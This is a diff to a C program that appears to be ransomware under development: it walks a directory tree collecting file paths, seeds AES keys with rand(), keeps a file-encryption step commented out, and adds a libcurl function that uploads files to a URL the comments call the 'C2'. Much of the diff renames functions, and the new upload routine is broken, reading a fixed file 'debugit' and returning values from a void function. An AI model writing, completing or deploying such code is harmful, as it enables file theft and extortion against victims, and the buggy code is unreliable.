@@ -4,6 +4,7 @@
 #include <stdint.h>
 #include <dirent.h>
 #include <time.h>
+#include <curl/curl.h>
 #include "lib/aes.h"
 
 typedef struct {
@@ -12,13 +13,14 @@ typedef struct {
     size_t capacity;
 } PathList;
 
+void sendFileToApi(const char *path, const char *api);
 void freePathList(PathList *pathList);
 void addToPathList(PathList *pathList, const char *path);
 void initPathList(PathList *pathList);
-void linux_list_files(const char *path, PathList *pathList);
-void encrypt_file(struct AES_ctx ctx, char file_path[256]);
-void generate_random_key(uint8_t *key, size_t key_length);
-void generate_random_iv(uint8_t *iv, size_t iv_length);
+void linuxListFiles(const char *path, PathList *pathList);
+void encryptFile(struct AES_ctx ctx, char file_path[256]);
+void generateRandomKey(uint8_t *key, size_t key_length);
+void generateRandomIv(uint8_t *iv, size_t iv_length);
 
 
 int main(){
@@ -26,10 +28,10 @@ int main(){
     srand((unsigned int)time(NULL));
 
     uint8_t key[32];
-    generate_random_key(key, sizeof(key));
+    generateRandomKey(key, sizeof(key));
 
     uint8_t iv[16];
-    generate_random_iv(iv, sizeof(iv));
+    generateRandomIv(iv, sizeof(iv));
 
     struct AES_ctx ctx;
     AES_init_ctx_iv(&ctx, key, iv);
@@ -39,14 +41,15 @@ int main(){
     PathList pathList;
     initPathList(&pathList);
 
-    linux_list_files(path, &pathList);
+    linuxListFiles(path, &pathList);
 
-    for (size_t i = 0; i < pathList.count; i++) {
+    for (size_t i = 0; i < pathList.count; ++i) {
         //printf("%s\n", pathList.paths[i]); Debug
         //Send the raw files to C2
+        sendFileToApi(pathList.paths[i], "https://192.168.0.1/path/to/file/api");
 
         //Encrypt each file with AES
-        //encrypt_file(ctx, "pathList.paths[i]");
+        //encryptFile(ctx, "pathList.paths[i]");
     }
     freePathList(&pathList);
 
@@ -60,8 +63,47 @@ int main(){
     return 0;
 }
 
+void sendFileToApi(const char *path, const char *api){
+    /*Documentation: https://curl.se/libcurl/c/fileupload.html */
+    CURL *curl;
+    CURLcode res;
+    struct stat file_info;
+    curl_off_t speed_upload, total_time;
+    FILE *fd;
+
+    fd = fopen("debugit", "rb"); /* open file to upload */
+    if(!fd)
+        return 1; /* cannot continue */
+
+    /* to get the file size */
+    if(fstat(fileno(fd), &file_info) != 0)
+        return 1; /* cannot continue */
+
+    curl = curl_easy_init();
+    if(curl){
+        /* upload to this place */
+        curl_easy_setopt(curl, CURLOPT_URL,
+                         api);
+
+        /* tell it to "upload" to the URL */
+        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
+
+        /* set where to read from (on Windows you need to use READFUNCTION too) */
+        curl_easy_setopt(curl, CURLOPT_READDATA, fd);
+
+        res = curl_easy_perform(curl);
+        if(res != CURLE_OK) {
+            //Woops
+        }
+
+        curl_easy_cleanup(curl);
+    }
+    fclose(fd);
+
+}
+
 //->Linux functions
-void linux_list_files(const char *path, PathList *pathList) {
+void linuxListFiles(const char *path, PathList *pathList) {
     struct dirent *entry;
     DIR *dp = opendir(path);
 
@@ -78,7 +120,7 @@ void linux_list_files(const char *path, PathList *pathList) {
             if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                 char subPath[1024];
                 snprintf(subPath, sizeof(subPath), "%s/%s", path, entry->d_name);
-                linux_list_files(subPath, pathList);
+                linuxListFiles(subPath, pathList);
             }
         }
     }
@@ -115,7 +157,7 @@ void freePathList(PathList *pathList) {
 }
 //<-End of linux functions
 
-void encrypt_file(struct AES_ctx ctx, char file_path[256]){
+void encryptFile(struct AES_ctx ctx, char file_path[256]){
     //@file_path accepts both absolute and relative path
 
     //Open raw file
@@ -162,13 +204,13 @@ void encrypt_file(struct AES_ctx ctx, char file_path[256]){
     fclose(end_fp);
 }
 
-void generate_random_key(uint8_t *key, size_t key_length) {
+void generateRandomKey(uint8_t *key, size_t key_length) {
     for (size_t i = 0; i < key_length; ++i) {
         key[i] = (uint8_t)rand();
     }
 }
 
-void generate_random_iv(uint8_t *iv, size_t iv_length) {
+void generateRandomIv(uint8_t *iv, size_t iv_length) {
     for (size_t i = 0; i < iv_length; ++i) {
         iv[i] = (uint8_t)rand();
     }
